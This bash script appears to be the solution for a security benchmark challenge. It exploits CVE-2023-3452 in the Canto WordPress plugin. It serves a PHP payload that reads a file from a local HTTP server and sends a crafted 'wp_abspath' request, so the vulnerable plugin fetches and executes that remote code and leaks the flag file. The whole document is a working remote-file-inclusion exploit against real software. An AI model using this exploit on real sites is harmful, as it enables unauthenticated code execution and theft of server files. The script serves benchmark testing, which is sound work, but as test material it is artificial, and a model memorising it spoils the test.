#!/usr/bin/env bash
# XBEN-034-24 — "Melodic Mayhem" (tags: cve)
#
# The Canto plugin, version 3.0.4, opens four files under
# `includes/lib/` that each begin with the same line:
#
#     require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');
#
# They are meant to be bootstrapped by WordPress and instead bootstrap
# themselves, from a path the request supplies, with no authentication of any
# kind. That is CVE-2023-3452.
#
# The suffix is fixed, so this is not a way to include an arbitrary local file.
# It does not need to be: the image sets `allow_url_include = On`, so the prefix
# can be a URL and the file included can be one we serve. That is why the
# benchmark pins its own subnet — the exploit has to name an address the
# container can reach, and the container's gateway is this machine.
#
#   $2 is the address the container should fetch from. Without it, docker is
#   asked for the gateway of the network the container is on.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT [host-address]}"
H5I="${H5I:-h5i}"
SESSION="xben034-$$"
FILE="${3:-/FLAG.txt}"
SERVE="$(mktemp -d)"
server=''
trap 'kill "$server" 2>/dev/null; rm -rf "$SERVE"; "$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

gateway="${2:-}"
if [ -z "$gateway" ]; then
    web_port="${URL##*:}"
    container="$(docker ps --format '{{.Names}} {{.Ports}}' | awk -v p=":$web_port->" '$0 ~ p {print $1; exit}')"
    gateway="$(docker inspect "$container" \
        --format '{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}')"
fi
[ -n "$gateway" ] || { echo "could not work out which address the container can reach" >&2; exit 1; }

# The file the plugin will require, on a port nothing else is using.
mkdir -p "$SERVE/wp-admin"
printf '<?php echo file_get_contents("%s"); ?>' "$FILE" > "$SERVE/wp-admin/admin.php"
port="$(python3 -c '
import socket
sock = socket.socket()
sock.bind(("", 0))
print(sock.getsockname()[1])
sock.close()
')"
(cd "$SERVE" && exec python3 -m http.server "$port" --bind 0.0.0.0 >/dev/null 2>&1) &
server=$!
# Wait for it rather than sleeping a guess: the request fails silently if the
# listener is not up yet, and "no flag found" would look like a bad payload.
for _ in $(seq 1 50); do
    curl -sf -o /dev/null "http://127.0.0.1:$port/wp-admin/admin.php" && break
    python3 -c 'import time; time.sleep(0.1)'
done

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create \
    --set 'path=/wp-content/plugins/canto/includes/lib/detail.php' \
    --set "query.wp_abspath=http://$gateway:$port" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
